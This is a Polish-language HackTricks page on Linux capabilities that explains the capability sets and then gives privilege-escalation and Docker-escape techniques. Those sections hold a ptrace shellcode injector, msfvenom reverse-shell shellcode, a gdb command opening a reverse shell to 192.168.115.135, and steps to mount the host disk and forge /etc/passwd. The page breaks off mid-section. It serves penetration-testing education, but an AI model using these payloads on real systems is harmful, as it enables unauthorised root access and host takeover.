# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Linux capabilities dzielą **uprawnienia roota na mniejsze, odrębne jednostki**, dzięki czemu procesy mogą mieć tylko część uprawnień. Ogranicza to ryzyko, ponieważ nie przyznaje się pełnych uprawnień roota bez potrzeby.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### Problem:

- Zwykli użytkownicy mają ograniczone uprawnienia do wykonywania operacji, takich jak otwieranie raw sockets lub nasłuchiwanie na portach internetowych poniżej 1024; capabilities mogą przyznać tylko uprawnienia wymagane do danej operacji, bez nadawania pełnych uprawnień roota.<sup>[[14]](#references)</sup>

### Zestawy capabilities:

Linux udostępnia te zestawy capabilities dla każdego wątku, a jądro stosuje ich ograniczenia, gdy proces zmienia dane uwierzytelniające lub wykonuje plik.<sup>[[14]](#references)</sup>

1. **Dziedziczony (CapInh)**:

   - **Cel**: Określa capabilities, które mogą zostać uwzględnione w zestawie dozwolonych capabilities po `execve()`, jeśli wykonywany plik ma pasujące dziedziczone file capabilities.
   - **Działanie**: Zestaw dziedziczony wątku zostaje zachowany po `execve()`; sam w sobie nie uaktywnia tych capabilities.
   - **Ograniczenia**: Dodawanie capability do tego zestawu jest ograniczone przez zestawy dozwolonych i ograniczających capabilities.<sup>[[14]](#references)</sup>

2. **Efektywny (CapEff)**:

   - **Cel**: Reprezentuje capabilities, z których proces aktualnie korzysta.
   - **Działanie**: Jest to zestaw capabilities sprawdzany przez jądro w celu przyznania uprawnień do różnych operacji. W przypadku plików ten zestaw może być flagą wskazującą, czy należy uwzględnić dozwolone capabilities pliku jako efektywne.
   - **Znaczenie**: Zestaw efektywny ma kluczowe znaczenie dla bieżącego sprawdzania uprawnień — jest aktywnym zestawem capabilities, z których proces może korzystać.

3. **Dozwolony (CapPrm)**:

   - **Cel**: Określa maksymalny zestaw capabilities, jakie może posiadać proces.
   - **Działanie**: Proces może przenieść capability z zestawu dozwolonego do zestawu efektywnego, uzyskując możliwość korzystania z niej. Może też usunąć capabilities ze swojego zestawu dozwolonego.
   - **Granica**: Jeśli capability zostanie usunięta z tego zestawu, zwykle nie można jej przywrócić bez wykonania pliku, który ją przyznaje, albo innego uprzywilejowanego przejścia.<sup>[[14]](#references)</sup>

4. **Ograniczający (CapBnd)**:

   - **Cel**: Ogranicza capabilities, które proces może uzyskać z pliku podczas `execve()`, oraz te, które może dodać do zestawu dziedziczonego.
   - **Działanie**: Zestaw jest dziedziczony przez `fork()` i zachowywany po `execve()`; capabilities można z niego usuwać, jeśli wywołujący ma `CAP_SETPCAP`.
   - **Zastosowanie**: Usunięcie zbędnych capabilities z tego zestawu ogranicza późniejsze uzyskiwanie uprawnień.<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
   - **Cel**: Umożliwia zachowanie wybranych capabilities jako dozwolonych i efektywnych po `execve()` programu nieuprzywilejowanego.
   - **Działanie**: Ambient capabilities są dodawane do nowych zestawów dozwolonych i efektywnych, jeśli wykonywany plik nie jest uprzywilejowany.
   - **Ograniczenia**: Capability może być ambient tylko wtedy, gdy znajduje się zarówno w zestawie dozwolonym, jak i dziedziczonym; wykonanie pliku set-user-ID/set-group-ID lub pliku z capabilities czyści zestaw ambient.<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Capabilities procesów i plików binarnych

### Capabilities procesów

Aby zobaczyć capabilities konkretnego procesu, użyj pliku **status** w katalogu /proc. Ponieważ zawiera on więcej szczegółów, ograniczmy się tylko do informacji związanych z Linux capabilities.\
Pamiętaj, że informacje o capabilities wszystkich uruchomionych procesów są przechowywane dla każdego wątku osobno, a file capabilities są zapisane w atrybutach rozszerzonych `security.capability`.<sup>[[14]](#references)[[15]](#references)</sup>

Definicje capabilities znajdziesz w /usr/include/linux/capability.h

Capabilities bieżącego procesu możesz sprawdzić za pomocą `cat /proc/self/status` lub polecenia `capsh --print`, a capabilities innych procesów — w `/proc/<pid>/status`.<sup>[[15]](#references)[[26]](#references)</sup>

```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```

To polecenie powinno zwrócić pięć wierszy z capabilities w większości systemów.<sup>[[15]](#references)</sup>

- CapInh = Dziedziczone capabilities
- CapPrm = Dozwolone capabilities
- CapEff = Efektywne capabilities
- CapBnd = Zbiór ograniczający
- CapAmb = Zbiór ambient capabilities

```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

Te liczby szesnastkowe nie mają sensu. Za pomocą narzędzia `capsh` możemy zdekodować je do nazw capabilities.<sup>[[26]](#references)</sup>

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```

Sprawdźmy teraz **capabilities** używane przez `ping`:

```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Chociaż to działa, istnieje inny i prostszy sposób. Aby zobaczyć capabilities działającego procesu, użyj narzędzia **getpcaps**, podając po nim identyfikator procesu (PID); akceptuje ono również listę identyfikatorów procesów.<sup>[[22]](#references)</sup>

```bash
getpcaps 1234
```

Sprawdźmy możliwości `tcpdump` po nadaniu plikowi binarnemu uprawnień `cap_net_admin` i `cap_net_raw` do przechwytywania ruchu sieciowego (`tcpdump` działa w procesie 9562).<sup>[[22]](#references)[[25]](#references)</sup>

```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

Jak widać, capabilities odpowiadają wynikom uzyskanym dwiema metodami inspekcji procesu. Narzędzie `getpcaps` używa libcap do sprawdzania capabilities procesu docelowego i wyświetla je w formie tekstowej; akceptuje jeden lub więcej PID-ów.<sup>[[22]](#references)</sup>

### Capabilities plików binarnych

Pliki binarne mogą mieć przypisane capabilities plikowe, które są stosowane podczas ich wykonywania. Na przykład plik binarny `ping` może mieć capability `cap_net_raw`.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```

Możesz **wyszukiwać pliki binarne z capabilities** za pomocą `getcap -r`.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Odbieranie uprawnień za pomocą capsh

Jeśli usuniemy `CAP_NET_RAW` z bieżącego zbioru ograniczającego, program wymagający tego uprawnienia nie powinien już móc z niego korzystać.<sup>[[26]](#references)</sup>

```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

Oprócz samego wyniku polecenia _capsh_, błąd powinno również zgłosić samo polecenie _tcpdump_.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

Błąd pokazuje, że po usunięciu `CAP_NET_RAW` ze zbioru ograniczającego `tcpdump` nie może zostać uruchomiony z żądanym file capability.

### Usuwanie capabilities

Możesz usunąć capabilities pliku za pomocą `setcap -r`.<sup>[[25]](#references)</sup>

```bash
setcap -r </path/to/binary>
```

## Uprawnienia użytkownika

Linux nie przypisuje capabilities plików bezpośrednio użytkownikowi logującemu się, ale moduł PAM `pam_cap` może ustawiać dziedziczone capabilities dla uwierzytelnionych sesji przy użyciu `/etc/security/capability.conf`.<sup>[[16]](#references)</sup> Każdy wpis przypisuje rozdzielone przecinkami nazwy lub numery capabilities do co najmniej jednej nazwy użytkownika.<sup>[[17]](#references)</sup>
Przykład pliku:

```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```

## Capabilities środowiska

Skompilowanie poniższego programu umożliwia **uruchomienie powłoki bash wewnątrz środowiska udostępniającego capabilities**.<sup>[[14]](#references)</sup>

```c:ambient.c
/*
 * Test program for the ambient capabilities
 *
 * compile using:
 * gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 * Set effective, inherited and permitted capabilities to the compiled binary
 * sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 *
 * To get a shell with additional caps that can be inherited do:
 *
 * ./ambient /bin/bash
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
  int rc;
  capng_get_caps_process();
  rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
  if (rc) {
    printf("Cannot add inheritable cap\n");
    exit(2);
  }
  capng_apply(CAPNG_SELECT_CAPS);
  /* Note the two 0s at the end. Kernel checks for these */
  if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
    perror("Cannot set cap");
    exit(1);
  }
}
void usage(const char * me) {
  printf("Usage: %s [-c caps] new-program new-args\n", me);
  exit(1);
}
int default_caplist[] = {
  CAP_NET_RAW,
  CAP_NET_ADMIN,
  CAP_SYS_NICE,
  -1
};
int * get_caplist(const char * arg) {
  int i = 1;
  int * list = NULL;
  char * dup = strdup(arg), * tok;
  for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
    list = realloc(list, (i + 1) * sizeof(int));
    if (!list) {
      perror("out of memory");
      exit(1);
    }
    list[i - 1] = atoi(tok);
    list[i] = -1;
    i++;
  }
  return list;
}
int main(int argc, char ** argv) {
  int rc, i, gotcaps = 0;
  int * caplist = NULL;
  int index = 1; // argv index for cmd to start
  if (argc < 2)
    usage(argv[0]);
  if (strcmp(argv[1], "-c") == 0) {
    if (argc <= 3) {
      usage(argv[0]);
    }
    caplist = get_caplist(argv[2]);
    index = 3;
  }
  if (!caplist) {
    caplist = (int * ) default_caplist;
  }
  for (i = 0; caplist[i] != -1; i++) {
    printf("adding %d to ambient list\n", caplist[i]);
    set_ambient_cap(caplist[i]);
  }
  printf("Ambient forking shell\n");
  if (execv(argv[index], argv + index))
    perror("Cannot exec");
  return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```

Wewnątrz **bash uruchomionego przez skompilowany plik binarny z ambient capabilities** można zaobserwować **nowe capabilities** (zwykły użytkownik nie będzie mieć żadnych capabilities w sekcji „current”).<sup>[[14]](#references)</sup>

```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```

> [!CAUTION]
> Możesz **dodawać wyłącznie capabilities obecne zarówno w zestawie dozwolonym, jak i dziedziczonym**.<sup>[[14]](#references)</sup>

### Binarne pliki Capability-aware/Capability-dumb

Binarne pliki Capability-dumb to programy z capabilities przypisanymi do pliku, które nie używają libcap do zarządzania nimi. Jeśli ustawiony jest bit effective pliku, kernel włącza dozwolone capabilities pliku do zestawu effective procesu; wykonanie może się nie powieść, jeśli proces nie uzyskał wszystkich dozwolonych capabilities.<sup>[[14]](#references)</sup>

## Capabilities usług

Usługa systemowa działająca jako root może zachować szeroki zakres capabilities, chyba że ogranicza je jej środowisko wykonawcze. W jednostce systemd `User=` wybiera użytkownika usługi, a `AmbientCapabilities=` dodaje wskazane capabilities do zestawu ambient uruchamianego procesu.<sup>[[18]](#references)</sup>

```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```

## Uprawnienia w kontenerach Docker

Docker uruchamia kontenery z domyślnym zestawem uprawnień, który można zmienić za pomocą `--cap-add` i `--cap-drop`; przykładowy kontener można sprawdzić za pomocą `amicontained`.<sup>[[19]](#references)[[24]](#references)</sup>

```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
	BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```

## Privesc/Container Escape

Capabilities są przydatne, gdy **chcesz ograniczyć własne procesy po wykonaniu operacji uprzywilejowanych** (np. po skonfigurowaniu chroot i powiązaniu z gniazdem). Można je jednak wykorzystać, przekazując złośliwe polecenia lub argumenty, które zostaną następnie uruchomione jako root.<sup>[[2]](#references)</sup>

Za pomocą `setcap` można wymuszać capabilities plików dla programów, a za pomocą `getcap` je sprawdzać.<sup>[[23]](#references)[[25]](#references)</sup>

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

W zapisie file-capability `+ep` podnosi wskazaną capability w zbiorach effective i permitted; `-` obniża wybrane flagi.<sup>[[21]](#references)</sup>

Aby zidentyfikować programy z capabilities w systemie lub folderze, użyj `getcap -r`.<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Przykład wykorzystania

W poniższym przykładzie plik binarny `/usr/bin/python2.6` okazuje się podatny na podniesienie uprawnień:

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

**Capabilities** wymagane przez `tcpdump`, aby **umożliwić dowolnemu użytkownikowi sniffowanie pakietów**:

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

### Szczególny przypadek pominięcia nazwy capability

W formacie tekstowym libcap wynik `getcap myelf` w postaci `myelf =ep` oznacza, że **wszystkie capabilities** są oznaczone jako effective i permitted, z zastrzeżeniem bounding set, user namespace i innych ograniczeń wykonywania procesu. Pusty zestaw file capabilities ma postać `myelf =` (bez `e` ani `p`); różni się od pliku bez atrybutu capability. Plik `=ep` sam w sobie nie zmienia UID procesu na root, ale program mogący używać `CAP_DAC_READ_SEARCH` lub `CAP_DAC_OVERRIDE` może odczytywać pliki, których nie mógłby odczytać przy swoim UID systemu Unix. Zanim uznasz opcje wejściowe programu za ścieżkę uprzywilejowanego odczytu plików, sprawdź tryb rzeczywistego pliku wykonywalnego, namespace oraz effective capabilities. Zobacz [format tekstowy capabilities](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html) i [zachowanie pustej wartości](https://man7.org/linux/man-pages/man8/getcap.8.html) w libcap.<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** to bardzo potężna Linux capability, często uznawana za niemal równoważną uprawnieniom root ze względu na rozległe **uprawnienia administracyjne**, takie jak montowanie urządzeń czy manipulowanie funkcjami jądra. Choć jest niezbędna w kontenerach symulujących całe systemy, **`CAP_SYS_ADMIN` stwarza poważne wyzwania związane z bezpieczeństwem**, zwłaszcza w środowiskach kontenerowych, ze względu na potencjał do privilege escalation i kompromitacji systemu. Dlatego jej użycie wymaga rygorystycznej oceny bezpieczeństwa i ostrożnego zarządzania. W kontenerach przeznaczonych dla konkretnych aplikacji należy w miarę możliwości usuwać tę capability, aby przestrzegać **zasady najmniejszych uprawnień** i minimalizować attack surface.<sup>[[14]](#references)</sup>

W przypadku przełączania namespace istotny jest zakres: `setns()` sprawdza `CAP_SYS_ADMIN` względem user namespace, do którego należy docelowy namespace. Wejście do mount namespace wymaga również `CAP_SYS_CHROOT` w user namespace wywołującego. Capability posiadana wyłącznie wewnątrz prywatnego, remapowanego user namespace nie daje więc dowolnego dostępu do początkowych namespace hosta.<sup>[[14]](#references)</sup>

**Przykład z plikiem binarnym**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```

Używając Pythona, możesz zamontować zmodyfikowany plik _passwd_ na rzeczywistym pliku _passwd_:

```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```

A na koniec **zamontuj** zmodyfikowany plik `passwd` pod `/etc/passwd`:

```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```

I będziesz mógł użyć **`su` jako root** przy użyciu hasła „password”.

**Przykład ze środowiskiem (Docker breakout)**

Możesz sprawdzić włączone capabilities wewnątrz kontenera Docker za pomocą:

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

W poprzednim wyniku widać, że capability SYS_ADMIN jest włączone.<sup>[[14]](#references)</sup>

- **Mount**

Przy odpowiednim dostępie do urządzeń i przestrzeni nazw może to pozwolić kontenerowi Docker na **zamontowanie dysku hosta i uzyskanie dostępu do jego zawartości**. Węzeł urządzenia musi reprezentować rzeczywiste urządzenie hosta, cgroup urządzeń musi na to zezwalać, a zamontowanie systemu plików opartego na blokach wymaga `CAP_SYS_ADMIN` w początkowej przestrzeni nazw użytkownika.<sup>[[14]](#references)</sup>

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/sda1 # Replace with the validated filesystem partition or LV.
mkdir -p /mnt/host
mount -o ro "${node_root_device}" /mnt/host
cat /mnt/host/etc/hostname
umount /mnt/host
```

- **Pełny dostęp**

W poprzedniej metodzie udało nam się uzyskać dostęp do dysku hosta.\
Jeśli na hoście działa serwer **ssh**, możesz **utworzyć użytkownika na zamontowanym dysku** i uzyskać do niego dostęp przez SSH.<sup>[[14]](#references)</sup>

```bash
#Like in the example before, the first step is to mount the docker host disk
node_root_device=/dev/sda1
mount "${node_root_device}" /mnt/host

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/host adduser john
ssh john@172.17.0.1 -p 2222
```

Bezpośrednie odczyty i zapisy w `/mnt/host` oznaczają już dostęp do systemu plików hosta. Końcowy `chroot` to tylko ułatwienie w pracy ze ścieżkami, a dodatkowo wymaga `CAP_SYS_CHROOT`; nie jest krokiem, który umożliwia ucieczkę.

## CAP_SYS_PTRACE

Dzięki `CAP_SYS_PTRACE` proces może śledzić i sprawdzać inne procesy widoczne w jego przestrzeni nazw PID. Aby z kontenera Docker uzyskać dostęp do procesów hosta, udostępnij przestrzeń nazw PID hosta za pomocą `--pid=host` (lub dołącz do przestrzeni nazw zawierającej proces docelowy).<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** umożliwia korzystanie z funkcji debugowania i śledzenia wywołań systemowych udostępnianych przez `ptrace(2)` oraz wywołań dołączania między pamięciami, takich jak `process_vm_readv(2)` i `process_vm_writev(2)`. Choć jest przydatna do diagnostyki i monitorowania, włączona `CAP_SYS_PTRACE` bez restrykcyjnych zabezpieczeń, takich jak filtr seccomp dla `ptrace(2)`, może poważnie osłabić bezpieczeństwo systemu. W szczególności można ją wykorzystać do obejścia innych ograniczeń bezpieczeństwa, zwłaszcza tych narzuconych przez seccomp, co pokazują [przykładowe exploity (PoC), takie jak ten](https://gist.github.com/thejh/8346f47e359adecd1d53).<sup>[[10]](#references)</sup>

**Przykład z plikiem binarnym (python)**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

**Przykład z plikiem binarnym (gdb)**

`gdb` z uprawnieniem `ptrace`:

```
/usr/bin/gdb = cap_sys_ptrace+ep
```

Capability przypisana debuggerowi jest jedynie wskazówką do dalszej weryfikacji. Sprawdź, czy bieżący proces może uruchomić ten konkretny plik (z uwzględnieniem uprawnień grupy i ACL), czy po uruchomieniu efektywna jest `CAP_SYS_PTRACE` oraz czy proces o wyższych uprawnieniach jest widoczny i można się do niego podłączyć w tej samej przestrzeni nazw PID. `no_new_privs`, montowanie z opcją `nosuid`, zbiór ograniczający capabilities, Yama, seccomp lub LSM mogą zmienić wynik. Zobacz [`capabilities(7)`](https://man7.org/linux/man-pages/man7/capabilities.7.html) i [dokumentację Yama w jądrze](https://docs.kernel.org/admin-guide/LSM/Yama.html). Wylicz metadane plików i procesów bez podłączania się do procesu docelowego.

Utwórz shellcode za pomocą msfvenom do wstrzyknięcia do pamięci przez gdb

```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
	chunk = payload[i:i+8][::-1]
	chunks = "0x"
	for byte in chunk:
		chunks += f"{byte:02x}"

	print(f"set {{long}}($rip+{i}) = {chunks}")
```

Debuguj proces uruchomiony jako root za pomocą gdb i wklej wcześniej wygenerowane linie gdb:

```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```

**Przykład ze środowiskiem (Docker breakout) — kolejne nadużycie GDB**

Jeśli **GDB** jest zainstalowane (lub możesz je zainstalować, na przykład za pomocą `apk add gdb` lub `apt install gdb`), możesz **debugować widoczny proces hosta** i wywołać w nim funkcję `system`. Wymaga to efektywnego `CAP_SYS_PTRACE` w przestrzeni nazw użytkownika procesu docelowego oraz widoczności PID-ów hosta; **nie** wymaga `CAP_SYS_ADMIN`. Yama, stan non-dumpable, seccomp i polityka LSM mogą nadal blokować dołączenie.

```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```

Nie będziesz w stanie zobaczyć wyniku wykonanego polecenia, ale zostanie ono wykonane przez ten proces (więc uzyskaj rev shell).

> [!WARNING]
> Jeśli pojawi się błąd "No symbol "system" in current context.", sprawdź poprzedni przykład ładowania shellcode'u do programu za pomocą gdb.

**Przykład ze środowiskiem (Docker breakout) - Shellcode Injection**

Możesz sprawdzić włączone capabilities w kontenerze Docker za pomocą:

```bash
capsh --print
